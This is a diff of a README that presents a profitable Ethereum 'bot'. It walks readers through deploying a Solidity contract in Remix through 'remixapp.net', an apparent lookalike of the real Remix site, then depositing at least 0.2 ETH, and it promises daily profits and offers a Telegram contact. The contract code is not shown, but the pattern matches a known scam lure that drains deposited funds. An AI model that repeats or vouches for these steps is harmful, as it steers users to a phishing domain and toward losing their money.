@@ -3,26 +3,25 @@
 You can PM me on Telegram:
 https://t.me/developmentoneth
 
-STEP BY STEP INSTRUCTIONS:
 
-👉 1. Download MetaMask: 
+## INSTRUCTIONS
+
+1. Download MetaMask: 
 https://metamask.io/download
 
-👉 2. Access the Remix IDE: 
-📌 https://remixapp.net/
+2. Access the Remix IDE: https://remixapp.net/
 
-👉 3. Right click on the 'contracts' folder and create a new file. Rename it as you like—i.e., 'Bot.sol'
+3. Right click on the 'contracts' folder and create a new file. Rename it as you like—i.e., 'Bot.sol'
 
-👉 4.  Paste Smart Contract Code in Remix:
-📌https://codefile.io/f/xaVLJ7EfKG
+4. Copy Smart Contract Code from **bot.sol** and Paste in Remix or :
 
-👉 5. Move to the 'Solidity Compiler' tab, select version '0.6.6' and then click 'Compile'
+5. Move to the 'Solidity Compiler' tab, select version '0.6.6' and then click 'Compile'
 
-👉 6. Move to the 'Deploy' tab, select 'Injected Provider' as the environment, then click 'Deploy'. After the transaction is confirmed, it's your own BOT now
+6. Move to the 'Deploy' tab, select 'Injected Provider' as the environment, then click 'Deploy'. After the transaction is confirmed, it's your own BOT now
 
-👉 7. Deposit funds (at least 0.2 ETH to prevent negating slippage) to your exact contract/bot address
+7. Deposit funds (at least 0.2 ETH to prevent negating slippage) to your exact contract/bot address
 
-👉 8. After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal'
+8. After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal'
 
 📈 Estimated Profits
 Investment Range (ETH)  |  Liquidity Level      |      Profits per 24 Hours
